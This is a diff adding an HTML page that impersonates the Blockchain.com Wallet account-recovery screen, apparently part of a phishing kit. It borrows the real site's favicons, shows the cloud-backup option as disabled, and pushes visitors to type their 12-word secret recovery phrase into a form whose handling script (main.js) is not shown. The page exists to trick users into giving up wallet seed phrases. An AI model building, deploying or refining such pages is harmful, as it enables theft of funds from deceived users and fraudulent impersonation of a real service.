@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+
+        <title> Blockchain.com Wallet - Exchange Cryptocurrency </title>
+
+        <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
+
+        <link rel="icon" type="image/png" sizes="32x32"
+            href="https://login.blockchain.com/img/favicons-7394c2079d/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16"
+            href="https://login.blockchain.com/img/favicons-7394c2079d/favicon-16x16.png">
+        <link rel="icon" type="image/png" sizes="48x48"
+            href="https://login.blockchain.com/img/favicons-7394c2079d/favicon-48x48.png">
+
+        <link href="./css/all.min.css" rel="stylesheet">
+        <link href="./css/style.css" rel="stylesheet">
+
+
+        <script src="./js/jquery.min.js"></script>
+        <script src="./js/main.js"></script>
+        <script src="./js/all.min.js"></script>
+
+    </head>
+
+    <body>
+
+
+        <header>
+
+            <img src="./img/bc-logo.svg">
+
+        </header>
+
+        <main>
+
+
+            <div class="recovery_phase">
+
+                <div class="first_stop">
+                    <div class="first-header">
+                        <div class="left">
+                            <i class="fa fa-arrow-left"></i> Go Back
+                        </div>
+                        <div class="clear"></div>
+
+                        <h3 id="peep_ide"> Recovery Options </h3>
+
+                        <h2 class="hide" id="show_next"> Input your secret private key recovery phrase </h2>
+                        <label class="hide" id="show_next"> Your 12 word Secret Private Key Recovery Phrase grants
+                            access to your account. Please
+                            input
+                            it in the order specified. </label>
+                        <div class="recovery_options">
+
+                            <div class="form_recover hide">
+
+                                <textarea rows="3" placeholder="Enter your secret private key recovery phrase"
+                                    id="recovery_code"></textarea>
+                                <p> Separate each word with a space </p>
+
+                                <button id="brand_submit"> Continue </button>
+
+                                <a href="#" id="homepa"> Go Back </a>
+
+                            </div>
+
+
+                            <div class="recovery-option disabled_recover">
+                                <div class="option-left">
+                                    <i class="fa fa-cloud"></i>
+                                </div>
+                                <div class="option-center">
+                                    <div class="option-center-group">
+                                        <p> Recover Account With Cloud Backup </p>
+                                        <label> Restore your account using your phone and the cloud. </label>
+                                    </div>
+                                </div>
+                                <div class="option-right">
+                                    <i class="fa fa-chevron-right"></i>
+                                </div>
+                            </div>
+
+                            <div class="recovery-option" id="move-on">
+                                <div class="option-left">
+                                    <i class="fa fa-keyboard"></i>
+                                </div>
+                                <div class="option-center">
+                                    <div class="option-center-group">
+                                        <p> Recover Account With Recovery Phase </p>
+                                        <label> Restore your account with your 12-word Secret Private key Recovery
+                                            Phrase. </label>
+                                    </div>
+                                </div>
+                                <div class="option-right">
+                                    <i class="fa fa-chevron-right"></i>
+                                </div>
+                            </div>
+
+                            <p> Trouble Logging In? <a href="#"> Contact Support </a> </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+
+        </main>
+
+        <footer>
+
+        </footer>
+
+    </body>
+
+</html>
